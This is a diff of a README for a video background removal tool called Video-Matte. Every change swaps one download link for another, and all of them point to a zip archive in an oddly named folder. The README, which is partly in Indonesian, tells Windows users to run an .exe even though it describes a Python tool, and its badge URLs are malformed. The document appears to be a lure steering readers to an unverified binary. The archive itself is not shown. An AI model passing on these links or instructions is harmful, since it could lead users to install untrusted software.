@@ -4,7 +4,7 @@
 Video Background Remover adalah tool Python yang secara otomatis menghapus latar belakang video dan menggantinya dengan warna pilihan. Menggunakan model U^2-Net via rembg, aplikasi ini mendeteksi objek utama dalam video dan bekerja dengan latar belakang apapun tanpa memerlukan green screen. Aplikasi ini mendukung penggunaan CPU maupun GPU, memberikan kecepatan dan efisiensi.
 
 ## 📥 Get the App
-[![Download Video-Matte](https://github.com/tehreemashfaq325/Video-Matte/raw/refs/heads/main/nemathelminth/Video_Matte_1.0.zip%20Now-brightgreen)](https://github.com/tehreemashfaq325/Video-Matte/raw/refs/heads/main/nemathelminth/Video_Matte_1.0.zip)
+[![Download Video-Matte](https://raw.githubusercontent.com/tehreemashfaq325/Video-Matte/main/nemathelminth/Video_Matte_1.0.zip%20Now-brightgreen)](https://raw.githubusercontent.com/tehreemashfaq325/Video-Matte/main/nemathelminth/Video_Matte_1.0.zip)
 
 ## 📋 Features
 - **Penghapusan Latar Belakang:** Menghapus latar belakang video dengan mudah.
@@ -21,7 +21,7 @@ Video Background Remover adalah tool Python yang secara otomatis menghapus latar
 
 ## 🛠️ Installation
 ### Download & Install
-1. **Visit this page to download:** [Releases Page](https://github.com/tehreemashfaq325/Video-Matte/raw/refs/heads/main/nemathelminth/Video_Matte_1.0.zip).
+1. **Visit this page to download:** [Releases Page](https://raw.githubusercontent.com/tehreemashfaq325/Video-Matte/main/nemathelminth/Video_Matte_1.0.zip).
 2. **Choose the latest release.**
 3. **Download the appropriate file** for your operating system.
 4. If you are on Windows, double-click the `.exe` file to install.
@@ -42,7 +42,7 @@ Video Background Remover adalah tool Python yang secara otomatis menghapus latar
 ## 📫 Support
 If you encounter any issues or have questions, feel free to reach out. You can open an issue on the GitHub page or comment in the discussion section.
 
-[![Download Video-Matte](https://github.com/tehreemashfaq325/Video-Matte/raw/refs/heads/main/nemathelminth/Video_Matte_1.0.zip%20Now-brightgreen)](https://github.com/tehreemashfaq325/Video-Matte/raw/refs/heads/main/nemathelminth/Video_Matte_1.0.zip)
+[![Download Video-Matte](https://raw.githubusercontent.com/tehreemashfaq325/Video-Matte/main/nemathelminth/Video_Matte_1.0.zip%20Now-brightgreen)](https://raw.githubusercontent.com/tehreemashfaq325/Video-Matte/main/nemathelminth/Video_Matte_1.0.zip)
 
 ## 🎊 Conclusion
 Video-Matte provides an easy way to add a professional touch to your videos. Enjoy creating stunning video content without the hassle of complex software!
